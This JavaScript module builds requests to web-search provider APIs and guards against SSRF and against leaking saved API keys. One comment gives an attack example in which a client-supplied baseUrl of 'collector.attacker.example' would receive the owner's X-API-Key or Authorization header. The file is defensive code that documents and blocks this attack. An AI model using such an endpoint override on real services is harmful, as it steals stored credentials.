/**
 * Search Provider Request Builders
 *
 * Builds HTTP request `{ url, init }` for 10 search providers.
 *
 * @typedef {Object} SearchProviderConfig
 * @property {string} id
 * @property {string} baseUrl
 * @property {string} [method]
 *
 * @typedef {Object} ContentOptions
 * @property {boolean} [snippet]
 * @property {boolean} [full_page]
 * @property {string}  [format]
 * @property {number}  [max_characters]
 *
 * @typedef {Object} SearchRequestParams
 * @property {string}   query
 * @property {string}   searchType
 * @property {number}   maxResults
 * @property {string}   [token]
 * @property {string}   [country]
 * @property {string}   [language]
 * @property {string}   [timeRange]
 * @property {number}   [offset]
 * @property {string[]} [domainFilter]
 * @property {ContentOptions}        [contentOptions]
 * @property {Record<string,unknown>} [providerOptions]
 * @property {Record<string,unknown>} [providerSpecificData]
 */

import { assertPublicUrl } from "../../../src/shared/utils/ssrfGuard.js";

// ── Helpers ─────────────────────────────────────────────────────────────

/**
 * Split domain filter into includes / excludes (excludes prefixed with "-").
 * @param {string[]} [domainFilter]
 * @returns {{includes: string[], excludes: string[]}}
 */
export function parseDomainFilter(domainFilter) {
  if (!domainFilter?.length) return { includes: [], excludes: [] };
  const includes = domainFilter.filter((d) => !d.startsWith("-"));
  const excludes = domainFilter.filter((d) => d.startsWith("-")).map((d) => d.slice(1));
  return { includes, excludes };
}

/**
 * Read string setting from providerOptions first, then providerSpecificData.
 * @param {SearchRequestParams} params
 * @param {string} key
 * @returns {string|undefined}
 */
export function getProviderSetting(params, key) {
  const fromOptions = params.providerOptions?.[key];
  if (typeof fromOptions === "string" && fromOptions.trim().length > 0) {
    return fromOptions.trim();
  }
  const fromProviderData = params.providerSpecificData?.[key];
  if (typeof fromProviderData === "string" && fromProviderData.trim().length > 0) {
    return fromProviderData.trim();
  }
  return undefined;
}

/**
 * Normalized destination origin — `protocol://host:port` with the implicit port
 * made explicit and the hostname lowercased / trailing-dot stripped. Two URLs
 * count as the *same destination* only when their origins match: matching on
 * origin instead of hostname also refuses an https→http downgrade or a port
 * swap, either of which would move the credential to a channel the owner never
 * configured. Returns null for values that are not a parseable http(s) URL.
 *
 * @param {unknown} value
 * @returns {string|null}
 */
function originOf(value) {
  const raw = typeof value === "string" ? value.trim() : "";
  if (!raw) return null;
  let parsed;
  try {
    parsed = new URL(raw);
  } catch {
    return null;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
  const host = parsed.hostname.toLowerCase().replace(/\.+$/, "");
  const port = parsed.port || (parsed.protocol === "https:" ? "443" : "80");
  return `${parsed.protocol}//${host}:${port}`;
}

/** Trimmed non-empty string, else undefined. */
function strOrUndef(value) {
  return typeof value === "string" && value.trim().length > 0 ? value.trim() : undefined;
}

/**
 * True when the request being built carries ANY credential. Deliberately not
 * string-typed: a token that reaches the header bag as a number/object would
 * still be serialized onto the wire, so treating it as "absent" would reopen
 * the exact leak this guard exists to close.
 */
function hasCredential(params) {
  const token = params?.token;
  return token != null && String(token).trim() !== "";
}

/**
 * Resolve base URL, honouring an endpoint override.
 *
 * Two override sources exist and they are NOT equally trusted:
 *   • `providerOptions.baseUrl`      → comes straight from the request body, so
 *                                       it is attacker-chosen (any gateway API
 *                                       key, or a loopback caller without one).
 *   • `providerSpecificData.baseUrl` → stored on the owner's connection / custom
 *                                       node by the dashboard; admin-controlled.
 *
 * Guards, in order:
 *  1. Shape + layer-1 SSRF (`assertPublicUrl`): http(s) only, never an internal
 *     or metadata literal address. Applies to both sources, as before.
 *  2. Credential binding (client source only): a client-supplied override may
 *     only *shadow* the destination the attached credential already belongs to —
 *     the provider's registry baseUrl or the owner's custom node. A request that
 *     carries no credential (authType "none", e.g. self-hosted SearXNG) may
 *     still point anywhere public, which keeps the BYO-instance use case.
 *
 * Without rule 2 the endpoint override is a straight credential-theft primitive:
 * `provider_options.baseUrl: "https://collector.attacker.example"` made the
 * server POST to the attacker with `X-API-Key`/`Authorization` set to the
 * owner's saved serper/tavily/exa/… key, and layer-1 happily passes any public
 * host. The network layer is separately covered by `fetchPublic` (DNS-resolved
 * check + per-hop redirect revalidation) in handlers/search/index.js.
 *
 * @param {SearchProviderConfig} config
 * @param {SearchRequestParams} params
 * @returns {string}
 */
export function resolveBaseUrl(config, params) {
  const clientOverride = strOrUndef(params.providerOptions?.baseUrl);
  const ownerOverride = strOrUndef(params.providerSpecificData?.baseUrl);
  const override = clientOverride || ownerOverride;
  if (!override) return (config.baseUrl || "").replace(/\/+$/, "");

  let parsed;
  try {
    parsed = new URL(override);
  } catch {
    throw new Error(`Invalid baseUrl: ${override}`);
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
    throw new Error(`Invalid baseUrl protocol: ${parsed.protocol}`);
  }
  // SSRF guard (layer 1): internal/private/metadata literals never leave here.
  assertPublicUrl(override);

  if (clientOverride && hasCredential(params)) {
    const allowed = new Set(
      [originOf(config.baseUrl), originOf(ownerOverride)].filter(Boolean)
    );
    if (!allowed.has(originOf(override))) {
      throw new Error(
        "provider_options.baseUrl may not point at a host other than the provider's " +
          "configured endpoint while a saved credential is attached"
      );
    }
  }

  return override.replace(/\/+$/, "");
}

/**
 * Final boundary check before a built search request hits the network.
 *
 * Every builder above routes through `resolveBaseUrl`, so rule 2 of that
 * function is what actually refuses an attacker-chosen host today. This exists
 * so the invariant cannot be reintroduced by a future builder that assembles
 * its own URL (or by the generic unknown-provider fallback): a request that
 * carries a saved credential may only target the provider's configured
 * destination — the registry `baseUrl` or the owner's custom node.
 *
 * Keyless requests (authType "none", e.g. self-hosted SearXNG) have no
 * credential to leak and may target any public host, which is the BYO case.
 *
 * @param {SearchProviderConfig} config
 * @param {SearchRequestParams} params
 * @param {string} url The fully built outbound URL
 */
export function assertCredentialDestination(config, params, url) {
  if (!hasCredential(params)) return;
  const allowed = new Set(
    [originOf(config?.baseUrl), originOf(params.providerSpecificData?.baseUrl)].filter(Boolean)
  );
  if (allowed.has(originOf(url))) return;
  throw new Error(
    "Refusing to send the saved provider credential to an unconfigured destination"
  );
}

/**
 * Convert offset+maxResults to 1-indexed page number.
 * @param {number|undefined} offset
 * @param {number} maxResults
 * @returns {number|undefined}
 */
export function toPageNumber(offset, maxResults) {
  if (typeof offset !== "number" || offset <= 0 || maxResults <= 0) return undefined;
  return Math.floor(offset / maxResults) + 1;
}

// ── Provider Request Builders ───────────────────────────────────────────

function buildSerperRequest(config, params) {
  const endpoint = params.searchType === "news" ? "/news" : "/search";
  const body = { q: params.query, num: params.maxResults };
  if (params.country) body.gl = params.country.toLowerCase();
  if (params.language) body.hl = params.language;
  return {
    url: `${resolveBaseUrl(config, params)}${endpoint}`,
    init: {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-API-Key": params.token },
      body: JSON.stringify(body),
    },
  };
}

function buildBraveRequest(config, params) {
  const endpoint = params.searchType === "news" ? "/news/search" : "/web/search";
  const qp = new URLSearchParams({ q: params.query, count: String(params.maxResults) });
  if (params.country) qp.set("country", params.country);
  if (params.language) qp.set("search_lang", params.language);
  return {
    url: `${resolveBaseUrl(config, params)}${endpoint}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json", "X-Subscription-Token": params.token },
    },
  };
}

function buildPerplexityRequest(config, params) {
  const body = { query: params.query, max_results: params.maxResults };
  if (params.country) body.country = params.country;
  if (params.language) body.search_language_filter = [params.language];
  if (params.domainFilter?.length) body.search_domain_filter = params.domainFilter;
  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${params.token}` },
      body: JSON.stringify(body),
    },
  };
}

function buildExaRequest(config, params) {
  const { includes, excludes } = parseDomainFilter(params.domainFilter);
  const body = {
    query: params.query,
    numResults: params.maxResults,
    type: "auto",
    text: true,
    highlights: true,
  };
  if (includes.length) body.includeDomains = includes;
  if (excludes.length) body.excludeDomains = excludes;
  if (params.searchType === "news") body.category = "news";
  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-key": params.token },
      body: JSON.stringify(body),
    },
  };
}

function buildTavilyRequest(config, params) {
  const { includes, excludes } = parseDomainFilter(params.domainFilter);
  const body = {
    query: params.query,
    max_results: params.maxResults,
    topic: params.searchType === "news" ? "news" : "general",
  };
  if (includes.length) body.include_domains = includes;
  if (excludes.length) body.exclude_domains = excludes;
  if (params.country) body.country = params.country;
  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${params.token}` },
      body: JSON.stringify(body),
    },
  };
}

function buildGooglePseRequest(config, params) {
  const apiKey = params.token;
  const cx = getProviderSetting(params, "cx");
  if (!apiKey || !cx) {
    throw new Error("Google Programmable Search requires both apiKey and cx");
  }
  const qp = new URLSearchParams({
    key: apiKey,
    cx,
    q: params.query,
    num: String(Math.min(params.maxResults, 10)),
  });
  if (params.country) qp.set("gl", params.country.toLowerCase());
  if (params.language) qp.set("hl", params.language);
  if (params.timeRange && params.timeRange !== "any") {
    const dateRestrictMap = { day: "d1", week: "w1", month: "m1", year: "y1" };
    const dateRestrict = dateRestrictMap[params.timeRange];
    if (dateRestrict) qp.set("dateRestrict", dateRestrict);
  }
  if (typeof params.offset === "number" && params.offset > 0) {
    qp.set("start", String(Math.min(params.offset + 1, 91)));
  }
  return {
    url: `${resolveBaseUrl(config, params)}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json" },
    },
  };
}

function buildLinkupRequest(config, params) {
  const apiKey = params.token;
  if (!apiKey) throw new Error("Linkup Search requires an API key");

  const { includes, excludes } = parseDomainFilter(params.domainFilter);
  const requestedDepth = getProviderSetting(params, "depth");
  const depth =
    requestedDepth && ["fast", "standard", "deep"].includes(requestedDepth)
      ? requestedDepth
      : "standard";

  const body = {
    q: params.query,
    depth,
    outputType: "searchResults",
    maxResults: params.maxResults,
  };
  if (includes.length) body.includeDomains = includes;
  if (excludes.length) body.excludeDomains = excludes;
  if (params.timeRange && params.timeRange !== "any") {
    const today = new Date();
    const toDate = today.toISOString().slice(0, 10);
    const from = new Date(today);
    if (params.timeRange === "day") from.setUTCDate(from.getUTCDate() - 1);
    if (params.timeRange === "week") from.setUTCDate(from.getUTCDate() - 7);
    if (params.timeRange === "month") from.setUTCMonth(from.getUTCMonth() - 1);
    if (params.timeRange === "year") from.setUTCFullYear(from.getUTCFullYear() - 1);
    body.fromDate = from.toISOString().slice(0, 10);
    body.toDate = toDate;
  }

  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${apiKey}` },
      body: JSON.stringify(body),
    },
  };
}

function buildSearchApiRequest(config, params) {
  const apiKey = params.token;
  if (!apiKey) throw new Error("SearchAPI requires an API key");

  const qp = new URLSearchParams({
    engine: params.searchType === "news" ? "google_news" : "google",
    q: params.query,
    api_key: apiKey,
  });
  if (params.country) qp.set("gl", params.country.toLowerCase());
  if (params.language) qp.set("hl", params.language);

  const page = toPageNumber(params.offset, params.maxResults);
  if (page) qp.set("page", String(page));

  return {
    url: `${resolveBaseUrl(config, params)}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json" },
    },
  };
}

function buildYouComRequest(config, params) {
  const apiKey = params.token;
  if (!apiKey) throw new Error("You.com Search requires an API key");

  const { includes, excludes } = parseDomainFilter(params.domainFilter);
  const qp = new URLSearchParams({
    query: params.query,
    count: String(Math.min(params.maxResults, 100)),
  });

  if (params.timeRange && params.timeRange !== "any") qp.set("freshness", params.timeRange);
  if (typeof params.offset === "number" && params.offset > 0 && params.maxResults > 0) {
    qp.set("offset", String(Math.min(Math.floor(params.offset / params.maxResults), 9)));
  }
  if (params.country) qp.set("country", params.country);
  if (params.language) qp.set("language", params.language);
  if (includes.length) qp.set("include_domains", includes.join(","));
  if (excludes.length) qp.set("exclude_domains", excludes.join(","));

  if (params.contentOptions?.full_page) {
    qp.set("livecrawl", params.searchType === "news" ? "news" : "web");
    qp.append(
      "livecrawl_formats",
      params.contentOptions.format === "markdown" ? "markdown" : "html"
    );
  }

  return {
    url: `${resolveBaseUrl(config, params)}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json", "X-API-Key": apiKey },
    },
  };
}

function buildSearxngRequest(config, params) {
  const baseUrl = resolveBaseUrl(config, params);
  const url = baseUrl.endsWith("/search") ? baseUrl : `${baseUrl}/search`;
  const qp = new URLSearchParams({
    q: params.query,
    format: "json",
    categories: params.searchType === "news" ? "news" : "general",
  });
  if (params.language) qp.set("language", params.language);
  if (params.timeRange && params.timeRange !== "any") qp.set("time_range", params.timeRange);

  const page = toPageNumber(params.offset, params.maxResults);
  if (page) qp.set("pageno", String(page));

  return {
    url: `${url}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json" },
    },
  };
}

function buildXquikRequest(config, params) {
  const apiKey = params.token;
  if (!apiKey) throw new Error("Xquik requires an API key");

  const queryType = getProviderSetting(params, "queryType");
  if (queryType && !["Latest", "Top"].includes(queryType)) {
    throw new Error("Xquik queryType must be Latest or Top");
  }

  const qp = new URLSearchParams({
    q: params.query,
    limit: String(params.maxResults),
  });
  const cursor = getProviderSetting(params, "cursor");
  if (cursor) qp.set("cursor", cursor);
  if (queryType) qp.set("queryType", queryType);
  if (params.language) qp.set("language", params.language);

  return {
    url: `${resolveBaseUrl(config, params)}?${qp}`,
    init: {
      method: "GET",
      headers: { Accept: "application/json", "x-api-key": apiKey },
    },
  };
}

// ── Ollama Cloud web_search ──────────────────────────────────────────────
// POST https://ollama.com/api/web_search { query, max_results }
// Response: { results: [{ title, url, content, published_at? }] }
function buildOllamaSearchRequest(config, params) {
  const body = { query: params.query, max_results: params.maxResults };
  if (params.country) body.country = params.country;
  if (params.language) body.language = params.language;
  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(params.token ? { Authorization: `Bearer ${params.token}` } : {}),
      },
      body: JSON.stringify(body),
    },
  };
}

// ── GLM Coding plan MCP web_search_prime ──────────────────────────────────
// POST https://api.z.ai/api/mcp/web_search_prime/mcp
// JSON-RPC envelope: { jsonrpc, id, method: "tools/call",
//   params: { name: "web_search_prime", arguments: { search_query, count } } }
// Response: { result: { content: [{ type: "text", text: "<json>" }] } }
function buildGlmSearchRequest(config, params) {
  const body = {
    jsonrpc: "2.0",
    id: `9r-${Date.now()}`,
    method: "tools/call",
    params: {
      name: "web_search_prime",
      arguments: { search_query: params.query, count: params.maxResults },
    },
  };
  return {
    url: resolveBaseUrl(config, params),
    init: {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(params.token ? { Authorization: `Bearer ${params.token}` } : {}),
      },
      body: JSON.stringify(body),
    },
  };
}

// ── Dispatcher ──────────────────────────────────────────────────────────

const BUILDERS = {
  "serper": buildSerperRequest,
  "brave-search": buildBraveRequest,
  "perplexity": buildPerplexityRequest,
  "exa": buildExaRequest,
  "tavily": buildTavilyRequest,
  "google-pse": buildGooglePseRequest,
  "linkup": buildLinkupRequest,
  "searchapi": buildSearchApiRequest,
  "youcom": buildYouComRequest,
  "searxng": buildSearxngRequest,
  "xquik": buildXquikRequest,
  "ollama-search": buildOllamaSearchRequest,
  "glm": buildGlmSearchRequest,
};

/**
 * Dispatch to the correct provider builder by `provider.id`.
 * Falls back to generic POST + bearer auth for unknown providers.
 * @param {SearchProviderConfig} provider
 * @param {SearchRequestParams} params
 * @returns {{url: string, init: RequestInit}}
 */
export function buildSearchRequest(provider, params) {
  const builder = BUILDERS[provider.id];
  if (builder) return builder(provider, params);

  return {
    url: resolveBaseUrl(provider, params),
    init: {
      method: provider.method || "POST",
      headers: {
        "Content-Type": "application/json",
        ...(params.token ? { Authorization: `Bearer ${params.token}` } : {}),
      },
      body: JSON.stringify({
        query: params.query,
        max_results: params.maxResults,
        search_type: params.searchType,
      }),
    },
  };
}
